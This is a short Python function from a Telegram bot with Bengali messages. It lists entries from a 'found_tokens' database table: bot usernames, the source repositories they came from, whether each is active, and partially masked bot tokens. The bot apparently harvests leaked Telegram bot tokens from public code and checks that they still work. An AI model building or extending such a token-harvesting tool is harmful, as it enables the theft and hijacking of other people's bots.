def show_found_bots(uid):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM found_tokens ORDER BY found_date DESC LIMIT 30")
    bots = c.fetchall()
    conn.close()
    
    if not bots:
        bot.send_message(uid, "❌ এখনো কিছু পাওয়া যায়নি!\n\n🔍 'সার্চ শুরু করো' বাটনে ক্লিক করুন।")
        return
    
    txt = "🤖 *সব ফাউন্ড বট:*\n\n"
    
    for b in bots:
        status_emoji = "✅" if b['is_active'] else "❌"
        txt += f"{status_emoji} @{b['bot_username']}\n"
        txt += f"   📁 {b['source']} | {b['repo_name'][:25]}\n"
        txt += f"   🔑 `{b['token'][:8]}...{b['token'][-5:]}`\n\n"
    
    if len(txt) > 4000:
        txt = txt[:3900] + f"\n\n...এবং আরও {len(bots)-15}টি"
    
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📊 সব দেখ", callback_data="show_all"))
    
    bot.send_message(uid, txt, reply_markup=kb)

